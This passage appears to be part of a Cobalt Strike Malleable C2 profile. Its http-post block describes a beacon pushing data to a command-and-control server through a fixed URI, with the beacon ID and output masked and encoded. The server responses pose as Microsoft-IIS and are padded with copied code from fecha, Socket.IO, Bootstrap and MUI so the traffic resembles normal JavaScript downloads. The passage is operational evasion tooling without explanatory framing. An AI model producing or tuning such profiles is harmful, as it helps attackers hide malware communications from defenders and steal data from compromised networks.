r(e.getHours())},m:function(e){return e.getMinutes()},mm:function(e){return r(e.getMinutes())},s:function(e){return e.getSeconds()},ss:function(e){return r(e.getSeconds())},S:function(e){return Math.round(e.getMilliseconds()/100)},SS:function(e){return r(Math.round(e.getMilliseconds()/10),2)},SSS:function(e){return r(e.getMilliseconds(),3)},a:function(e,t){return e.getHours()<12?t.amPm[0]:t.amPm[1]},A:function(e,t){return(e.getHours()<12?t.amPm[0]:t.amPm[1]).toUpperCase()},ZZ:function(e){e=e.getTimezoneOffset();return(0<e?\"-\":\"+\")+r(100*Math.floor(Math.abs(e)/60)+Math.abs(e)%60,4)}}),p={d:[\"\\d\\d?\",function(e,t){e.day=t}],Do:[\"\\d\\d?\"+t,function(e,t){e.day=parseInt(t,10)}],M:[\"\\d\\d?\",function(e,t){e.month=t-1}],yy:[\"\\d\\d?\",function(e,t){var n=+(\"\"+(new Date).getFullYear()).substr(0,2);e.year=\"\"+(68<t?n-1:n)+t}],h:[\"\\d\\d?\",function(e,t){e.hour=t}],m:[\"\\d\\d?\",function(e,t){e.minute=t}],s:[\"\\d\\d?\",function(e,t){e.second=t}],yyyy:[\"\\d{4}\",function(e,t){e.year=t}],S:[\"\\d\",function(e,t){e.millisecond=100*t}],SS:[\"\\d{2}\",function(e,t){e.millisecond=10*t}],SSS:[\"\\d{3}\",function(e,t){e.millisecond=t}],D:[\"\\d\\d?\",e],ddd:[t,e],MMM:[t,i(\"monthNamesShort\")],MMMM:[t,i(\"monthNames\")],a:[t,function(e,t,n){t=t.toLowerCase();t===n.amPm[0]?e.isPm=!1:t===n.amPm[1]&&(e.isPm=!0)}],ZZ:[\"[^\\s]*?[\\+\\-]\\d\\d:?\\d\\d|[^\\s]*?Z\",function(e,t){var n,t=(t+\"\").match(/([+-]|\\d\\d)/gi);t&&(n=60*t[1]+parseInt(t[2],10),e.timezoneOffset=\"+\"===t[0]?n:-n)}]};p.dd=p.d,p.dddd=p.ddd,p.DD=p.D,p.mm=p.m,p.hh=p.H=p.HH=p.h,p.MM=p.M,p.ss=p.s,p.A=p.a,u.masks={default:\"ddd MMM dd yyyy HH:mm:ss\",shortDate:\"M/D/yy\",mediumDate:\"MMM d, yyyy\",longDate:\"MMMM d, yyyy\",fullDate:\"dddd, MMMM d, yyyy\",shortTime:\"HH:mm\",mediumTime:\"HH:mm:ss\",longTime:\"HH:mm:ss.SSS\"},u.format=function(t,e,n){var i=n||u.i18n;if(\"number\"==typeof t&&(t=new Date(t)),\"[object Date]\"!==Object.prototype.toString.call(t)||isNaN(t.getTime()))throw new Error(\"Invalid Date in fecha.format\");e=u.masks[e]||e||u.masks.default;var r=[];return(e=(e=e.replace(h,function(e,t){return r.push(t),\"@@@\"})).replace(c,function(e){return e in d?d[e](t,i):e.slice(1,e.length-1)})).replace(/@@@/g,function(){return r.shift()})},u.parse=function(e,t,n){var i=n||u.i18n;if(\"string\"!=typeof t)throw new Error(\"Invalid format in fecha.parse\");if(t=u.masks[t]||t,1e3<e.length)return null;var r={},o=[],s=[],n=(n=(t=t.replace(h,function(e,t){return s.push(t),\"@@@\"})).replace(/[|\\{()[^$+*?.-]/g,\"\\$&\").replace(c,function(e){var t;return p[e]?(t=p[e],o.push(t[1]),\"(\"+t[0]+\")\"):e})).replace(/@@@/g,function(){return s.shift()}),a=e.match(new RegExp(n,\"i\"));if(!a)return null;for(var l=1;l<a.length;l++)o[l-1](r,a[l],i);t=new Date;return!0===r.isPm&&null!=r.hour&&12!=+r.hour?r.hour=+r.hour+12:!1===r.isPm&&12==+r.hour&&(r.hour=0),null!=r.timezoneOffset?(r.minute=+(r.minute||0)-+r.timezoneOffset,new Date(Date.UTC(r.year||t.getFullYear(),r.month||0,r.day||1,r.hour||0,r.minute||0,r.second||0,r.millisecond||0))),n=
";
            append "
/*!
 * Socket.IO v4.5.4
 * (c) 2014-2022 Guillermo Rauch
 * Released under the MIT License.
 */
(function (global, factory) {
  typeof exports === 'object' && typeof module !== 'undefined' ? module.exports = factory() :
  typeof define === 'function' && define.amd ? define(factory) :
  (global = typeof globalThis !== 'undefined' ? globalThis : global || self, global.io = factory());
})(this, (function () { 'use strict';

  function _typeof(obj) {
    \"@babel/helpers - typeof\";

    return _typeof = \"function\" == typeof Symbol && \"symbol\" == typeof Symbol.iterator ? function (obj) {
      return typeof obj;
    } : function (obj) {
      return obj && \"function\" == typeof Symbol && obj.constructor === Symbol && obj !== Symbol.prototype ? \"symbol\" : typeof obj;
    }, _typeof(obj);
  }

  function _classCallCheck(instance, Constructor) {
    if (!(instance instanceof Constructor)) {
      throw new TypeError(\"Cannot call a class as a function\");
    }
  }

  function _defineProperties(target, props) {
    for (var i = 0; i < props.length; i++) {
      var descriptor = props[i];
      descriptor.enumerable = descriptor.enumerable || false;
      descriptor.configurable = true;
      if (\"value\" in descriptor) descriptor.writable = true;
      Object.defineProperty(target, descriptor.key, descriptor);
    }
  }

  function _createClass(Constructor, protoProps, staticProps) {
    if (protoProps) _defineProperties(Constructor.prototype, protoProps);
    if (staticProps) _defineProperties(Constructor, staticProps);
    Object.defineProperty(Constructor, \"prototype\", {
      writable: false
    });
    return Constructor;
  }

  function _extends() {
    _extends = Object.assign ? Object.assign.bind() : function (target) {
      for (var i = 1; i < arguments.length; i++) {
        var source = arguments[i];

        for (var key in source) {
          if (Object.prototype.hasOwnProperty.call(source, key)) {
            target[key] = source[key];
          }
        }
      }

      return target;
    };
    return _extends.apply(this, arguments);
  }
";
            print;
        }

    }
}

################################################
## HTTP POST
################################################
http-post { # Don't think of this in terms of HTTP POST, but as a beacon transaction of pushing data to the server

    set uri "/def/v7.88/DM33EBRW"; # URI used for POST block. 
    set verb "POST"; # HTTP verb used in POST block. Can be GET or POST

    client {

        header "Accept" "application/xml, text/html, image/*";
        header "Accept-Language" "ar-kw";
        header "Accept-Encoding" "compress, gzip";
       
        id {
            mask; # Transform type
            base64url; # Transform type
            parameter "_CNSFWASU";            
        }
              
        output {
            mask; # Transform type
            netbios; # Transform type
            print;
        }
    }

    server {

        header "Server" "Microsoft-IIS/10.0";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "plain/text; charset=utf-8";

        output {
            mask; # Transform type
            netbiosu; # Transform type
            prepend "
/*!
  * Bootstrap v5.2.3 (https://getbootstrap.com/)
  * Copyright 2011-2022 The Bootstrap Authors (https://github.com/twbs/bootstrap/graphs/contributors)
  * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
  */
!function(t,e){\"object\"==typeof exports&&\"undefined\"!=typeof module?module.exports=e(require(\"@popperjs/core\")):\"function\"==typeof define&&define.amd?define([\"@popperjs/core\"],e):(t=\"undefined\"!=typeof globalThis?globalThis:t||self).bootstrap=e(t.Popper)}(this,(function(t){\"use strict\";function e(t){if(t&&t.__esModule)return t;const e=Object.create(null,{[Symbol.toStringTag]:{value:\"Module\"}});if(t)for(const i in t)if(\"default\"!==i){const s=Object.getOwnPropertyDescriptor(t,i);Object.defineProperty(e,i,s.get?s:{enumerable:!0,get:()=>t[i]})}return e.default=t,Object.freeze(e)}const i=e(t),s=\"transitionend\",n=t=>{let e=t.getAttribute(\"data-bs-target\");if(!e||\"#\"===e){let i=t.getAttribute(\"href\");if(!i||!i.includes(\"#\")&&!i.startsWith(\".\"))return null;i.includes(\"#\")&&!i.startsWith(\"#\")&&(i=`#${i.split(\"#\")[1]}`),e=i&&\"#\"!==i?i.trim():null}return e},o=t=>{const e=n(t);return e&&document.querySelector(e)?e:null},r=t=>{const e=n(t);return e?document.querySelector(e):null},a=t=>{t.dispatchEvent(new Event(s))},l=t=>!(!t||\"object\"!=typeof t)&&(void 0!==t.jquery&&(t=t[0]),void 0!==t.nodeType),c=t=>l(t)?t.jquery?t[0]:t:\"string\"==typeof t&&t.length>0?document.querySelector(t):null,h=t=>{if(!l(t)||0===t.getClientRects().length)return!1;const e=\"visible\"===getComputedStyle(t).getPropertyValue(\"visibility\"),i=t.closest(\"details:not([open])\");if(!i)return e;if(i!==t){const e=t.closest(\"summary\");if(e&&e.parentNode!==i)return!1;if(null===e)return!1}return e},d=t=>!t||t.nodeType!==Node.ELEMENT_NODE||!!t.classList.contains(\"disabled\")||(void 0!==t.disabled?t.disabled:t.hasAttribute(\"disabled\")&&\"false\"!==t.getAttribute(\"disabled\")),u=t=>{if(!document.documentElement.attachShadow)return null;if(\"function\"==typeof t.getRootNode){const e=t.getRootNode();return e instanceof ShadowRoot?e:null}return t instanceof ShadowRoot?t:t.parentNode?u(t.parentNode):null},_=()=>{},g=t=>{t.offsetHeight},f=()=>window.jQuery&&!document.body.hasAttribute(\"data-bs-no-jquery\")?window.jQuery:null,p=[],m=()=>\"rtl\"===document.documentElement.dir,b=t=>{var e;e=()=>{const e=f();if(e){const i=t.NAME,s=e.fn[i];e.fn[i]=t.jQueryInterface,e.fn[i].Constructor=t,e.fn[i].noConflict=()=>(e.fn[i]=s,t.jQueryInterface)}},\"loading\"===document.readyState?(p.length||document.addEventListener(\"DOMContentLoaded\",(()=>{for(const t of p)t()})),p.push(e)):e()},v=t=>{\"function\"==typeof t&&t()},y=(t,e,i=!0)=>{if(!i)return void v(t);const n=(t=>{if(!t)return 0;let{transitionDuration:e,transitionDelay:i}=window.getComputedStyle(t);const s=Number.parseFloat(e),n=Number.parseFloat(i);return s||n?(e=e.split(\",\")[0],i=i.split(\",\")[0],1e3*(Number.parseFloat(e)+Number.parseFloat(i))):0})(e)+5;let o=!1;const r=({target:i})=>{i===e&&(o=!0,e.removeEventListener(s,r),v(t))};e.addEventListener(s,r),setTimeout((()=>{o||a(e)}),n)},w=(t,e,i,s)=>{const n=t.length;let o=t.indexOf(e);return-1===o?!i&&s?t[n-1]:t[0]:(o+=i?1:-1,s&&(o=(o+n)%n),t[Math.max(0,Math.min(o,n-1))])},A=/[^.]*(?=\\..*)\\.|.*/,E=/\\..*/,C=/::\\d+$/,T={};let k=1;const L={mouseenter:\"mouseover\",mouseleave:\"mouseout\"},O=
";
            append "
\"use strict\";var _interopRequireWildcard=require(\"@babel/runtime/helpers/interopRequireWildcard\"),_interopRequireDefault=require(\"@babel/runtime/helpers/interopRequireDefault\");Object.defineProperty(exports,\"__esModule\",{value:!0}),exports.default=exports.styles=void 0;var _extends2=_interopRequireDefault(require(\"@babel/runtime/helpers/extends\")),_objectWithoutProperties2=_interopRequireDefault(require(\"@babel/runtime/helpers/objectWithoutProperties\")),React=_interopRequireWildcard(require(\"react\")),_propTypes=_interopRequireDefault(require(\"prop-types\")),_clsx=_interopRequireDefault(require(\"clsx\")),_withStyles=_interopRequireDefault(require(\"../styles/withStyles\")),_capitalize=_interopRequireDefault(require(\"../utils/capitalize\")),_Paper=_interopRequireDefault(require(\"../Paper\")),styles=function(e){var t=\"light\"===e.palette.type?e.palette.grey[100]:e.palette.grey[900];return{root:{display:\"flex\",flexDirection:\"column\",width:\"100%\",boxSizing:\"border-box\",zIndex:e.zIndex.appBar,flexShrink:0},positionFixed:{position:\"fixed\",top:0,left:\"auto\",right:0,\"@media print\":{position:\"absolute\"}},positionAbsolute:{position:\"absolute\",top:0,left:\"auto\",right:0},positionSticky:{position:\"sticky\",top:0,left:\"auto\",right:0},positionStatic:{position:\"static\"},positionRelative:{position:\"relative\"},colorDefault:{backgroundColor:t,color:e.palette.getContrastText(t)},colorPrimary:{backgroundColor:e.palette.primary.main,color:e.palette.primary.contrastText},colorSecondary:{backgroundColor:e.palette.secondary.main,color:e.palette.secondary.contrastText},colorInherit:{color:\"inherit\"},colorTransparent:{backgroundColor:\"transparent\",color:\"inherit\"}}};exports.styles=styles;var AppBar=React.forwardRef(function(e,t){var r=e.classes,o=e.className,i=e.color,a=void 0===i?\"primary\":i,i=e.position,i=void 0===i?\"fixed\":i,e=(0,_objectWithoutProperties2.default)(e,[\"classes\",\"className\",\"color\",\"position\"]);return React.createElement(_Paper.default,(0,_extends2.default)({square:!0,component:\"header\",elevation:4,className:(0,_clsx.default)(r.root,r[\"position\".concat((0,_capitalize.default)(i))],r[\"color\".concat((0,_capitalize.default)(a))],o,\"fixed\"===i&&\"mui-fixed\"),ref:t},e))});\"production\"!==process.env.NODE_ENV&&(AppBar.propTypes={children:_propTypes.default.node,classes:_propTypes.default.object,className:_propTypes.default.string,color:_propTypes.default.oneOf([\"default\",\"inherit\",\"primary\",\"secondary\",\"transparent\"]),position:_propTypes.default.oneOf([\"absolute\",\"fixed\",\"relative\",\"static\",\"sticky\"])});var _default=(0,_withStyles.default)(styles,{name:\"MuiAppBar\"})(AppBar);exports.default=_
";
            print;

        }
    }
}
